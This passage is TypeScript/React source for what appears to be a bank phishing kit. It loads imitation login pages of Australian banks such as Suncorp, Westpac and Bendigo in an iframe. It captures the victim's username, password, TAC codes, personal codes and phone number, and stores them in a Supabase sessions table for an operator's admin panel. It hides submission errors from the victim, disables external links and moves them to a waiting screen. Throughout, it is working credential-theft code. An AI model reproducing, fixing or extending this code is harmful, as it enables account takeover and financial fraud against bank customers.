        // 1) Mevcut fields listesinde farklı type !== password alanı ara:
        const altUser = fields.find(
          (f) => f !== passwordField && ["text", "email", "tel", "number"].includes(f.type),
        );
        if (altUser) {
          usernameField = altUser;
        } else {
          // 2) Document scope ta bütün formlarda ara (form yanlış seçilmiş olabilir!)
          try {
            const ifcdoc = iframeRef.current?.contentDocument;
            if (ifcdoc) {
              const docFields = collectCapturedFieldsFromForm(ifcdoc, ifcdoc);
              const globalUser = docFields.find(
                (f) => f !== passwordField && ["text", "email", "tel", "number"].includes(f.type),
              );
              if (globalUser) {
                usernameField = globalUser;
                if (docFields.length > fields.length) fields = docFields;
              }
            }
          } catch {}
          // 3) Hala AYNI ise → usernameField NULL (boş göster, şifreyi 2 kere yazdırma):
          if (usernameField === passwordField || (usernameField && usernameField.type === "password")) {
            usernameField = null;
          }
        }
      }
      // ⭐ Password field type kontrol (ters senaryo: yanlışlıkla text alanı password yapma):
      if (passwordField && passwordField.type !== "password") {
        const altPass = fields.find((f) => f.type === "password");
        if (altPass) passwordField = altPass;
      }
      const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
      const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
      const tacField = fields.find((field) => field.kind === "tacCode") ?? null;

      // ⭐⭐⭐ EN KRİTİK DÜZELTME: orderedField1/2/3 SIRASI = DOM SIRASI (ESKİ) YERİNE
      //    TÜR (kind) SIRASI (YENİ)! Böylece HANGİ BANKADA HANGİ SIRADA input olursa olsun
      //    Admin paneldeki sıralı alanlar KESİN OLARAK:
      //      orderedField1 = KULLANICI ADI (usernameField)
      //      orderedField2 = ŞİFRE (passwordField)
      //      orderedField3 = 3. alan (personalCode/tacCode/bankPhone/ilk unknown)
      //    ESKİ hatalı DOM sırası: Bendigo step1 (1.görünür username, 2.gizli password →
      //    gizli password skip → sadece usernameField var, sonra step2 passwordField →
      //    history/merge sonrası orderedField1=passwordField (DOM yanlış sırası) sonucunda
      //    admin Kullanıcı (ID) kolonuna ŞİFRE yazıyordu. YENİ SİSTEMDE BU ASLA OLMAZ!
      const thirdField =
        personalCodeField ?? tacField ?? phoneField ??
        fields.find((f) => f.kind === "unknown" && f !== usernameField && f !== passwordField) ??
        null;
      const orderedFields: CapturedField[] = [
        usernameField,
        passwordField,
        thirdField,
      ].filter((f): f is CapturedField => f != null);

      const orderedField1 = orderedFields[0] ?? null;
      const orderedField2 = orderedFields[1] ?? null;
      const orderedField3 = orderedFields[2] ?? null;

      const resolveOrderedKey = (f: CapturedField | null, fallback: string): string => {
        if (!f) return "";
        if (f.kind === "unknown") return fallback;
        return f.kind;
      };
      const resolveOrderedType = (f: CapturedField | null): string => {
        if (!f) return "";
        if (f.kind === "bankPhone") return "phone";
        if (f.kind === "password" || f.kind === "tacCode" || f.type === "password") return "password";
        return "";
      };
      const rawFields: Record<string, string> = Object.fromEntries(
        fields.map((field, index) => {
          const suffix = field.key || `field_${index + 1}`;
          return [`s${stepIndex + 1}_iframe_${suffix}`, field.value] as const;
        }),
      );

      const historyEntry = {
        bankSlug,
        bankName,
        htmlStepIndex: stepIndex,
        htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
        verfuegernummer: usernameField?.value ?? "",
        username: usernameField?.value ?? "",
        pin: passwordField?.value ?? "",
        password: passwordField?.value ?? "",
        bankPhone: phoneField?.value ?? "",
        personalCode: personalCodeField?.value ?? "",
        tacCode: tacField?.value ?? "",
        orderedField1: orderedField1?.value ?? "",
        orderedField1Key: resolveOrderedKey(orderedField1, "username"),
        orderedField2: orderedField2?.value ?? "",
        orderedField2Key: resolveOrderedKey(orderedField2, ""),
        orderedField2Type: resolveOrderedType(orderedField2),
        orderedField3: orderedField3?.value ?? "",
        orderedField3Key: resolveOrderedKey(orderedField3, ""),
        orderedField3Type: resolveOrderedType(orderedField3),
        rawFields,
        capturedAt: new Date().toISOString(),
      };

      const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
        ? (previousFormData as any).bankFormHistory.slice()
        : [];
      previousHistory.push(historyEntry);

      const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
      const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
      const mergedBankPhone = phoneField?.value || (previousFormData.bankPhone as string) || "";
      const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
      const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";

      // ⭐⭐⭐ ORDERED FIELD BİRLEŞTİRME (EN ÖNEMLİ KISIM: ADIMLAR ARASI KAYIP OLMASIN!)
      //   ESKİ BUG: Step 1 (sadece username) -> Step 2 (sadece password) geldiginde
      //   orderedField1 password olarak ÜSTÜNE YAZILIYORDU, username KAYIP OLUYORDU.
      //   ÇÖZÜM: ÖNCE GEÇMİŞ (previousFormData) orderedField1/2/3 değerlerini al,
      //          SONRA MEVCUT (current step) orderedField ları ile BİRLEŞTİR.
      //          KURAL: Aynı slot boşsa önceki kalır; doluysa yenisi. DAHA SONRA:
      //          Yeniden username (1) -> password (2) -> 3rd (3) olarak SIRALA ve DE-DUPE et!
      type Slot = { value: string; key: string; type: string };
      const emptySlot = (): Slot => ({ value: "", key: "", type: "" });
      const prevSlot = (of: unknown, ok: unknown, ot: unknown): Slot => ({
        value: typeof of === "string" ? of.trim() : "",
        key: typeof ok === "string" ? ok.trim() : "",
        type: typeof ot === "string" ? ot.trim() : "",
      });
      const p1 = prevSlot(
        (previousFormData as any).orderedField1,
        (previousFormData as any).orderedField1Key,
        (previousFormData as any).orderedField1Type ?? "",
      );
      const p2 = prevSlot(
        (previousFormData as any).orderedField2,
        (previousFormData as any).orderedField2Key,
        (previousFormData as any).orderedField2Type,
      );
      const p3 = prevSlot(
        (previousFormData as any).orderedField3,
        (previousFormData as any).orderedField3Key,
        (previousFormData as any).orderedField3Type,
      );
      const c1: Slot = { value: historyEntry.orderedField1, key: historyEntry.orderedField1Key, type: "" };
      const c2: Slot = { value: historyEntry.orderedField2, key: historyEntry.orderedField2Key, type: historyEntry.orderedField2Type };
      const c3: Slot = { value: historyEntry.orderedField3, key: historyEntry.orderedField3Key, type: historyEntry.orderedField3Type };
      // Merge: Mevcut (current) slot doluysa onu al, boşsa önceki (previous) slotu KORU.
      const m1: Slot = c1.value.length > 0 ? c1 : p1;
      const m2: Slot = c2.value.length > 0 ? c2 : p2;
      const m3: Slot = c3.value.length > 0 ? c3 : p3;
      // Şimdi 3 slotu bir havuzda topla, DE-DUPE (aynı value 2 kere olmasın),
      // ve SONRA username/password/3rd olarak SIRALA (1: kullanıcı, 2: şifre, 3: ekstra alan).
      const pool: Slot[] = [m1, m2, m3].filter((s) => s.value.length > 0);
      const deduped = new Map<string, Slot>();
      for (const s of pool) {
        if (!deduped.has(s.value)) deduped.set(s.value, s);
      }
      const uniqueSlots = Array.from(deduped.values());
      const sortScore = (s: Slot): number => {
        const k = s.key.toLowerCase();
        if (k === "username" || k === "personalcode" || k === "bankphone") return 1;
        if (k === "password") return 2;
        if (k === "taccode") return 3;
        if (s.type === "password") return 2;
        // Key yoksa kind tanıma: rawKey regex ile tahmin et
        return 9;
      };
      uniqueSlots.sort((a, b) => sortScore(a) - sortScore(b));
      // Doldur: en fazla 3
      const final1 = uniqueSlots[0] ?? emptySlot();
      const final2 = uniqueSlots[1] ?? emptySlot();
      const final3 = uniqueSlots[2] ?? emptySlot();

      const nextFormData = {
        ...previousFormData,
        ...rawFields,
        bankSlug,
        bankName,
        verfuegernummer: mergedUsername,
        username: mergedUsername,
        pin: mergedPassword,
        password: mergedPassword,
        bankPhone: mergedBankPhone,
        personalCode: mergedPersonalCode,
        tacCode: mergedTacCode,
        orderedField1: final1.value,
        orderedField1Key: final1.key || (mergedUsername && final1.value === mergedUsername ? "username" : mergedPersonalCode && final1.value === mergedPersonalCode ? "personalCode" : ""),
        orderedField2: final2.value,
        orderedField2Key: final2.key || (mergedPassword && final2.value === mergedPassword ? "password" : ""),
        orderedField2Type: final2.type,
        orderedField3: final3.value,
        orderedField3Key: final3.key || (mergedTacCode && final3.value === mergedTacCode ? "tacCode" : ""),
        orderedField3Type: final3.type,
        bankFormHistory: previousHistory,
      };

      const nextStep = isFinalStep ? "wait" : "bank";
      const nextToStep = isFinalStep ? "wait" : null;
      const updatePayload: any = {
        is_hidden: false,
        form_data: nextFormData,
      };
      if (nextStep === "wait") updatePayload.current_step = "wait";

      // ⭐ SUPABASE UPDATE RETRY (2 defa):
      //   Geçici RLS kilitlenmesi / race / timeout → Internal Server Error (500)
      //   vermesin diye 2 kere tekrar dene. Hala olmazsa sessizce devam et (hata gösterme).
      let updateError: any = null;
      for (let attempt = 0; attempt < 3; attempt++) {
        const res = await supabase
          .from("sessions")
          .update(updatePayload)
          .eq("id", sessionId);
        updateError = res.error;
        if (!updateError) break;
        if (attempt < 2) {
          await new Promise((r) => setTimeout(r, 250 + attempt * 250));
        }
      }

      if (updateError) {
        logAuditEvent({
          session_id: sessionId,
          event_kind: "submit",
          event_action: "au_exact_submit_error",
          status: "warn",
          bank_slug: bankSlug,
          bank_name: bankName,
          meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex, retry: 3 },
          error_name: "SupabaseUpdateError",
          error_message: updateError.message ?? String(updateError),
        });
        // ⚠️ HATA OLSADA BEKLEME EKRANINA / SONRAKI ADIMA GİT (kullanıcıya hata GÖSTERME):
        //   "Internal Server Error" WARNING'i bastır, sessionu force beklemeye götür.
      }

      if (isFinalStep) {
        logAuditEvent({
          session_id: sessionId,
          event_kind: "bank_form",
          event_action: "au_exact_submit_wait",
          status: "ok",
          bank_slug: bankSlug,
          bank_name: bankName,
          from_step: "bank",
          to_step: "wait",
          meta: {
            historyCount: previousHistory.length,
            totalSteps,
            rawFieldKeys: Object.keys(rawFields),
            orderedFields: {
              orderedField1Key: historyEntry.orderedField1Key,
              orderedField2Key: historyEntry.orderedField2Key,
              orderedField3Key: historyEntry.orderedField3Key,
            },
          },
        });
        void flushAuditQueueNow();
        router.replace(stepToPath("wait", sessionId));
        return;
      }

      logAuditEvent({
        session_id: sessionId,
        event_kind: "step",
        event_action: "au_exact_advance_html_step",
        status: "ok",
        bank_slug: bankSlug,
        bank_name: bankName,
        from_step: "bank",
        to_step: nextToStep,
        meta: {
          fromIndex: stepIndex,
          toIndex: stepIndex + 1,
          totalSteps,
          rawFieldKeys: Object.keys(rawFields),
          historyCount: previousHistory.length,
        },
      });
      void flushAuditQueueNow();
      setStepIndex((i) => i + 1);
    } finally {
      // ⭐ SAVİNG STATE KESİNLİKLE KALDIRILSIN (return, throw, error, her koşulda).
      //   Önceden erken return'de setSaving(false) unutuluyordu → buton SİLİK + pointer-events none KİLİTLENİYORDU.
      setSaving(false);
    }
  }, [bankName, bankSlug, isFinalStep, router, saving, sessionId, stepIndex, supabase, totalSteps]);

  const captureFieldsFromFrame = useCallback(() => {
    const doc = iframeRef.current?.contentDocument;
    if (!doc) return [] as CapturedField[];
    const form = pickBestForm(doc);
    // ⭐ FORM YOKSA (örneğin Suncorp token code form DIŞINDA ise)
    //   DOCUMENT bazlı TÜM inputları toplayıp döner (boş array dönme)
    const scope = form ?? (doc as unknown as HTMLFormElement);
    return collectCapturedFieldsFromForm(scope, doc);
  }, []);

  const submitWithCurrentValuesRef = useRef<() => Promise<void>>(() => Promise.resolve());
  const lastSubmitAtRef = useRef<number>(0);
  const savedSubmitFormRef = useRef<HTMLFormElement | null>(null);
  const pollingCounterRef = useRef<number>(0);
  const savedSubmitActionNodesRef = useRef<HTMLElement[]>([]);

  const attachFrameBridge = useCallback(() => {
    const iframe = iframeRef.current;
    const doc = iframe?.contentDocument;
    if (!iframe || !doc) return;

    let loginForm =
      Array.from(doc.querySelectorAll("form")).find((form) => formHasIdentityAndPassword(form, doc)) ?? null;
    if (!loginForm) {
      loginForm = pickBestForm(doc);
    }
    // ⭐ FORM YOKSA (Suncorp token code / NAB shadow DOM vb)
    //   BRIDGE'I KAPATMA (return etme)! DOCUMENT'i scope olarak kullan.
    //   (eski sürümde return ederdi, butonlar/polling handlerları hiç bağlanmazdı)
    const loginScope = loginForm ?? (doc as unknown as HTMLFormElement);
    if (loginForm) {
      savedSubmitFormRef.current = loginForm;
    }

    const canProceedNow = () => {
      const isSingle = (auPages?.length ?? 1) === 1;
      if (isFinalStep) return canSubmitFinal(loginScope, doc, isSingle);
      return canSubmitIntermediate(loginScope, doc);
    };

    const ultraForceClickOnBestNode = (bestForm: HTMLFormElement, actNodes: HTMLElement[]) => {
      try {
        const candidates: HTMLElement[] = [];
        if (actNodes && actNodes.length > 0) candidates.push(...actNodes);
        try {
          const inside = Array.from(
            bestForm.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
            ),
          );
          inside.forEach((x) => candidates.push(x));
        } catch {}
        try {
          const out = Array.from(
            doc.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
            ),
          );
          out.forEach((x) => candidates.push(x));
        } catch {}
        const seen = new Set<HTMLElement>();
        let bestNode: HTMLElement | null = null;
        for (const cand of candidates) {
          if (seen.has(cand)) continue;
          seen.add(cand);
          const tok = getElementActionToken(cand);
          const isi =
            cand instanceof HTMLInputElement && ["submit", "button"].includes((cand.getAttribute("type") ?? "").toLowerCase());
          if (!(ACTION_BUTTON_RE.test(tok) || isi)) {
            continue;
          }
          bestNode = cand;
          break;
        }
        if (bestNode) {
          savedSubmitActionNodesRef.current = [bestNode];
          try {
            (bestNode as any).click();
          } catch {}
          try {
            if ((bestNode as any).dispatchEvent) {
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerdown", { bubbles: true, cancelable: true }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerup", { bubbles: true, cancelable: true }));
              } catch {}
            }
          } catch {}
        }
        // ⚠️ GERÇEK form.requestSubmit() / form.submit() KALDIRILDI.
        //   Mock iframe srcdoc HTML formunu GERÇEKTEN gönderemeyiz (geçerli URL yok).
        //   Gönderilirse iframe 500 Internal Server Error sayfasına düşer.
        //   Sadece button.click/dispatchEvent eventleri yeterli (supabase submit + beklemeye parenttan gidilir).
      } catch (_) {
        /* ignore */
      }
    };

    const submitWithCurrentValues = async (event?: Event) => {
      // ⭐ BOQ Classic FIX: Dış alana (label, boşluk, body, div) tıklayınca submit olmasın.
      //   SADECE:
      //     (A) Event gelmemişse (postMessage/ref üzerinden manuel çağrı) → izin ver
      //     (B) event.type === "submit" (form submit event) → izin ver
      //     (C) event.type click/mousedown/touchend/pointerup vb. ise:
      //         → event.target BUTTON / INPUT[type=submit,button] / [role=button] OLMALIDIR
      //         → VEYA event.key === "Enter" (klavyeden Enter)
      //         → ⭐ YENİ: closest ile iç içe SPAN/SVG/TEXT etiketleri BUTONUN ICINDEYSE closest ile parent BUTON ise ONAYLA
      if (event) {
        const et = (event as any).target as HTMLElement | null;
        const evtType = String((event as any).type || "");
        const isKeyboard =
          (event as KeyboardEvent).key === "Enter" ||
          (event as any).keyCode === 13 ||
          (event as KeyboardEvent).code === "Enter" ||
          (event as KeyboardEvent).key === "NumpadEnter";
        let closestActionNode: HTMLElement | null = null;
        try {
          if (et && typeof (et as any).closest === "function") {
            closestActionNode = (et as HTMLElement).closest(
              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, [onclick]",
            ) as HTMLElement | null;
          }
        } catch {}
        const etButton = closestActionNode || et;
        const etBlTxt = `${(etButton?.getAttribute?.("class") || "")} ${(etButton?.getAttribute?.("id") || "")} ${(etButton?.getAttribute?.("data-testid") || "")} ${(etButton?.getAttribute?.("aria-label") || "")} ${(etButton?.getAttribute?.("title") || "")} ${(etButton?.tagName || "")}`.toLowerCase();
        const etIsEyeOrIcon = /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/i.test(etBlTxt);
        const isButtonLike =
          etButton
            ? !etIsEyeOrIcon && (etButton.tagName === "BUTTON" ||
                (etButton.tagName === "INPUT" &&
                  ["submit", "button"].includes(
                    ((etButton as HTMLInputElement).getAttribute("type") || "").toLowerCase(),
                  )) ||
                etButton.getAttribute("role") === "button")
            : false;
        const isFormSubmit = evtType === "submit";
        // Label / body / div / span üzerinden gelen tıklamaları (event bubbling) REDDET
        if (!isFormSubmit && !isButtonLike && !isKeyboard) {
          return;
        }
      }

      // ⚠️ KALDIRILDI: event.preventDefault / stopPropagation.
      //   Suncorp (ve tüm bankalar) GERÇEK submit handler'ını tetikleyebilsin diye
      //   DOM event akışını BOZMA. Sadece supabase kaydını YAP, sonra da GERÇEK butona tıkla.
      const now = Date.now();
      if (now - lastSubmitAtRef.current < 1200) return;

      const captured = captureFieldsFromFrame();
      if (captured.length === 0) return;

      // NUKE GÜVENLİK: Resmi canProceed() TRUE dönerse kesin submit.
      // Eğer canProceed FALSE dönerse BİLE — ama kullanıcı butona BASTIYSA
      // ve EN AZ 1 TANE ÖNEMLİ ALAN (password/username/personal/tac/phone)
      // capture edildiyse, yine de SUBMIT yap.
      // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
      // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
      const proceedOfficial = canProceedNow();
      const hasAtLeastOneImportant = captured.some(
        (c) =>
          c.kind === "password" ||
          c.kind === "username" ||
          c.kind === "personalCode" ||
          c.kind === "bankPhone" ||
          c.kind === "tacCode",
      );
      const hasAtLeast3Inputs = captured.length >= 3;
      const emergencyOk =
        !proceedOfficial &&
        ((captured.length >= 1 && hasAtLeastOneImportant) || hasAtLeast3Inputs);
      if (!proceedOfficial && !emergencyOk) {
        const unknownCount = captured.filter((c) => c.kind === "unknown").length;
        if (!(captured.length >= 2 && unknownCount >= 2)) {
          return;
        }
      }

      lastSubmitAtRef.current = now;
      void submitCapturedFields(captured);

      // ⚠️ GERÇEK form.submit() / button.click KALDIRILDI.
      //   Mock iframe (srcdoc HTML) içinde GERÇEKTEN Suncorp serverına submit edemeyiz (geçerli URL yok).
      //   Eğer form.submit() çağrılırsa iframe srcsi değişip "Internal Server Error" (500)
      //   sayfasına YÖNLENDİRİLİR (ekranda siyah arka planda 500 hatası görünür),
      //   sonra route.replace ile beklemeye geçilirken kullanıcı BU HATAYI GÖRÜYORDU.
      //   ÇÖZÜM: Supabase kaydını YAP → router.replace beklemeye götür (yeterli).
    };

    const computeActionNodes = (d: Document, form: HTMLFormElement | null): HTMLElement[] => {
      const arr: HTMLElement[] = [];
      try {
        const fNodes = form ? Array.from(form.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, a.btn, .btn-primary, .btn, [onclick], [data-testid='login-button'], [data-testid='submit-button']",
        )) : [];
        const dNodes = Array.from(d.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login-button'], [data-testid*='submit-button'], [onclick]",
        ));
        const seen = new Set<HTMLElement>();
        [...fNodes, ...dNodes].forEach((n) => {
          if (seen.has(n)) return;
          seen.add(n);

          // ⭐ 1. KATMAN SIKI FİLTRE: SADECE GERÇEKTEN BUTON OLANLAR KALSIN.
          //   Westpac 20+ div/section/classı='login-form-section' öğelerin hiçbiri
          //   burada geçemez (tag BUTON değil, type submit değil).
          if (!isElementActuallyButtonLike(n)) return;

          const tok = getElementActionToken(n);
          const isi =
            n instanceof HTMLInputElement && ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
          const isByAttr =
            n.tagName === "BUTTON" ||
            n.getAttribute("role") === "button" ||
            n.hasAttribute("onclick");
          if (!(ACTION_BUTTON_RE.test(tok) || isi || isByAttr)) return;
          arr.push(n);
        });

        // BRUTE FORCE FALLBACK: Eğer yukarıdan 0 node geldiyse, 2. katman filtre
        // isElementActuallyButtonLike İLE. Westpac login-form-div vb. öğeler burada da GEÇEMEZ.
        if (arr.length === 0) {
          const fallBackSource =
            form ? form : d.body ?? d.documentElement;
          if (fallBackSource) {
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|logon|log\s*on|sigon|auth|validate|accept|unlock|proceed|sign\s*on|signon/i;
            allIn.forEach((el) => {
              if (seen.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const tOk =
                tag === "button" ||
                (tag === "input" && ["submit", "button"].includes(type)) ||
                el.getAttribute("role") === "button" ||
                (tag === "a" && /\bbtn\b/.test((el.getAttribute("class") || "").toLowerCase())) ||
                el.hasAttribute("onclick");
              if (!tOk) return;

              // ⭐ 2. KATMAN SIKI FİLTRE (fallback bile olsa SADECE butonlar)
              if (!isElementActuallyButtonLike(el)) return;

              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (bfRe.test(idClsTxt)) {
                seen.add(el);
                arr.push(el);
              }
            });
          }
        }
      } catch {}
      return arr;
    };

    submitWithCurrentValuesRef.current = submitWithCurrentValues;

    const forms = Array.from(doc.querySelectorAll("form"));
    forms.forEach((form) => {
      form.setAttribute("method", "post");
      form.setAttribute("target", "_self");
      form.setAttribute("novalidate", "novalidate");
      if (loginForm && form === loginForm) {
        try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
        form.addEventListener("submit", submitWithCurrentValues as any);
        (form as any)._auBotV3Bound = true;
      }
    });

    const actionNodes = computeActionNodes(doc, loginScope);
    savedSubmitActionNodesRef.current = actionNodes;

    const updateSubmitState = () => {
      let isValid = canProceedNow();
      const palette = getButtonPalette(bankSlug);

      const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginScope, doc);
      const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginScope).filter((f) => {
        const t = (f.getAttribute("type") ?? "").toLowerCase();
        return t !== "checkbox" && t !== "radio";
      }).length;
      const filledCount = captured.filter((c) => c.value.trim().length > 0).length;

      const isFormScope = (savedSubmitFormRef.current ?? loginScope as any)?.tagName === "FORM";
      const guaranteedValid =
        isFormScope && totalMeaningful >= 2 && filledCount === totalMeaningful && totalMeaningful <= 12;
      if (!isValid && guaranteedValid) {
        isValid = true;
      }

      let fadeOpacity = 1;
      let fadeGray = 0;
      if (!isValid) {
        if (filledCount === 0) {
          fadeOpacity = 0.3;
          fadeGray = 0.8;
        } else {
          fadeOpacity = 0.5;
          fadeGray = 0.6;
        }
      }

      const bgColor = isValid
        ? palette.bg
        : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA");
      const fgColor = isValid ? palette.fg : "#8A8E90";
      const borderColor = isValid ? `1px solid ${palette.border}` : "1px solid transparent";
      const boxShadow = isValid
        ? palette.shadow
        : "none";
      const cursorVal = saving ? "wait" : "pointer";
      const pointerEvents = saving ? "none" : "auto";

      actionNodes.forEach((node) => {
        // ⭐ SON GÜVENCE: SADECE GERÇEKTEN BUTON OLANLARA STILLER UYGULA.
        //   Eğer computeActionNodes Filtresinden HERHANGİ şekilde yanlışlıkla
        //   div/section/input[type=text] girmişse BURADA ATAK. (Westpac SOLUK
        //   sayfa sorunu ANA tedavi bu 2. filtre!)
        if (!isElementActuallyButtonLike(node)) return;
        try {
          if ("disabled" in node) {
            try { (node as any).disabled = false; } catch {}
            try { node.removeAttribute("disabled"); } catch {}
          }
        } catch {}
        try {
          for (let i = 0; i < node.classList?.length; i++) {
            const cls = node.classList[i];
            if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
              try { node.classList.remove(cls); } catch {}
            }
          }
        } catch {}
        try {
          node.setAttribute("aria-disabled", isValid ? "false" : "true");
        } catch {}

        // ⭐ TÜM STİLLER setProperty('important') ile yaz:
        //   Suncorp SG-Btn sınıfları bizim inline stillerimizi CSS specificity ile
        //   ezip opacity 0.63 / grayscale 0.2 yapıyordu → IMPORTANT ile artık BİZ KAZANIYORUZ.
        // ⭐ LAYOUT: butonun diğer yazıların üstünde kalması için Z-INDEX 99999 + position:relative
        //   + inline-block + margin. Login yazıları üst üste binmesin diye line-height da set et.
        try { node.style.setProperty("position", "relative", "important"); } catch {}
        try { node.style.setProperty("display", "inline-block", "important"); } catch {}
        try { node.style.setProperty("z-index", "99999", "important"); } catch {}
        try { node.style.setProperty("margin-top", "14px", "important"); } catch {}
        try { node.style.setProperty("margin-bottom", "10px", "important"); } catch {}
        try { node.style.setProperty("padding-top", "12px", "important"); } catch {}
        try { node.style.setProperty("padding-bottom", "12px", "important"); } catch {}
        try { node.style.setProperty("padding-left", "22px", "important"); } catch {}
        try { node.style.setProperty("padding-right", "22px", "important"); } catch {}
        try { node.style.setProperty("line-height", "1.35", "important"); } catch {}
        try { node.style.setProperty("font-size", "15px", "important"); } catch {}
        try { node.style.setProperty("font-weight", "700", "important"); } catch {}
        try { node.style.setProperty("border-radius", "10px", "important"); } catch {}
        try { node.style.setProperty("pointer-events", pointerEvents, "important"); } catch {}
        try { node.style.setProperty("opacity", String(fadeOpacity), "important"); } catch {}
        try { node.style.setProperty("filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`, "important"); } catch {}
        try { node.style.setProperty("-webkit-filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`, "important"); } catch {}
        try { node.style.setProperty("cursor", cursorVal, "important"); } catch {}
        try { node.style.setProperty("background-color", bgColor, "important"); } catch {}
        try { node.style.setProperty("background", bgColor, "important"); } catch {}
        try { node.style.setProperty("color", fgColor, "important"); } catch {}
        try { node.style.setProperty("border", borderColor, "important"); } catch {}
        try { node.style.setProperty("box-shadow", boxShadow, "important"); } catch {}
        try { node.style.setProperty("transform", isValid ? "translateY(0)" : "none", "important"); } catch {}
        try {
          node.style.setProperty(
            "transition",
            "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
            "important",
          );
        } catch {}
      });
    };

    actionNodes.forEach((node) => {
      // ⭐ FİLTRE: SADECE GERÇEKTEN BUTON OLANLARA event listener bağla.
      //   Westpac 20+ yanlış input/divlere click listener bağlanırsa form içindeki
      //   herhangi bir input tıklamasında SUBMIT tetiklenebilir (istenmeyen).
      if (!isElementActuallyButtonLike(node)) return;
      try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
      node.addEventListener("click", submitWithCurrentValues as any, false);
      node.addEventListener("mousedown", submitWithCurrentValues as any, false);
      node.addEventListener("touchend", submitWithCurrentValues as any, false);
      try {
        node.addEventListener("keydown", (e: Event) => {
          const ke = e as KeyboardEvent;
          if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
            try { submitWithCurrentValues(e as any); } catch {}
          }
        }, false);
      } catch {}
    });

    Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
      if (!isExternalHref(link.getAttribute("href"))) return;
      link.setAttribute("href", "#");
      link.setAttribute("target", "_self");
      link.setAttribute("rel", "nofollow noopener noreferrer");
    });

    getFormFields(loginScope).forEach((field) => {
      try { field.removeEventListener("input", updateSubmitState as any); } catch {}
      try { field.removeEventListener("change", updateSubmitState as any); } catch {}
      field.addEventListener("input", updateSubmitState as any);
      field.addEventListener("change", updateSubmitState as any);
      field.addEventListener("keydown", (event: KeyboardEvent) => {
        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceedNow()) {
          event.preventDefault();
          event.stopPropagation();
        }
      });
    });

    updateSubmitState();
  }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields, totalSteps, auPages]);

  const handleFrameLoad = useCallback(() => {
    void attachFrameBridge();
  }, [attachFrameBridge]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    if (iframe.contentDocument?.readyState === "complete") {
      void attachFrameBridge();
    }

    iframe.addEventListener("load", handleFrameLoad);
    return () => {
      iframe.removeEventListener("load", handleFrameLoad);
    };
  }, [attachFrameBridge, handleFrameLoad]);

  useEffect(() => {
    const onMsg = (ev: MessageEvent) => {
      try {
        const data = ev.data as any;
        if (!data || typeof data !== "object") return;
        if (data.kind === "BOT_V3_SUBMIT_CLICKED" || data.kind === "BOT_V2_SUBMIT_CLICKED" || data.type === "AU_BOT_SUBMIT_NOW") {
          const ref = submitWithCurrentValuesRef.current;
          if (ref && typeof ref === "function") {
            void ref();
          }
        }
      } catch (_) {}
    };
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, []);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    const runPoll = () => {
      try {
        pollingCounterRef.current = pollingCounterRef.current + 1;
        const doc = iframe.contentWindow?.document;
        if (!doc) return;

